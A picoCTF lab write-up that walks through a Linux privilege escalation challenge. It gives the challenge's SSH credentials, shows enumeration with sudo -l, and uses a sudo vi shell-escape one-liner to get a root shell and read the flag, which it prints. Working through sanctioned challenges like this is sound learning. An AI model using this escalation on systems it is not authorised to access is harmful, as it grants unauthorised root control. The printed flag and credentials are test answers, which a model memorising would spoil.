# Description

Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with.

Through Social engineering, we've got the credentials to use on the server. SSH is running on the server.

saturn.picoctf.net 60137
Username: picoctf
Password: urTi-qvQtA

**tags: Binary Exploitation, privilege_escalation**

# Notes

- Sign in to the server
`ssh ssh -p 60137 picoctf@saturn.picoctf.net`

```bash
picoctf@challenge:~$ pwd
/home/picoctf
```

- Nothing seems to be in the current directory

```bash
picoctf@challenge:/home$ ls
picoctf
picoctf@challenge:/home$ ls -a
.  ..  picoctf
```

```bash
picoctf@challenge:/home$ cd picoctf/
picoctf@challenge:~$ ls -a
.  ..  .bash_logout  .bashrc  .cache  .profile  .server.py
```

- `chche`, `profile`, `server.py` looks interesting..

```bash
picoctf@challenge:~$ cd .cache/
picoctf@challenge:~/.cache$ ls
motd.legal-displayed
```

- `motd.legal-displayed` file is empty

`cat .profile`
```
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
        . "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi
```

`cat server.py`
```py
import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)
#saving ping details to a variable
host_info = socket.gethostbyaddr(ip) 
#getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
print("Hello, this is a part of information gathering",'Host: ', host_info)
```

- Code looks like it's just makes ping request and encodes the IP address `host_info[2]` is just a IP address
- Try running python file anyways

```bash
picoctf@challenge:~$ python3 .server.py 
sh: 1: ping: not found
Traceback (most recent call last):
  File ".server.py", line 7, in <module>
    host_info = socket.gethostbyaddr(ip) 
socket.gaierror: [Errno -5] No address associated with hostname
```

- Error because you can't ping because not root user?
- Let's see what commands we can use

`sudo -l`
```bash
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

- All users can use /usr/bin/vi which is `vim`
- Upon research came across [this](https://gtfobins.github.io/gtfobins/vi/)
  - If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

`sudo vi -c ':!/bin/sh' /dev/null`
```bash
# pwd
/home/picoctf
# whoami
root
```

- We are now a root user!

```bash
# cd ~
# ls
# ls -a
.  ..  .bashrc .flag.txt  .profile
```

- Now we can see the `.flag.txt`
`cat .flag.txt`

**Flag found: picoCTF{pYth0nn_libraryH!j@CK!n9_4c188d27}**
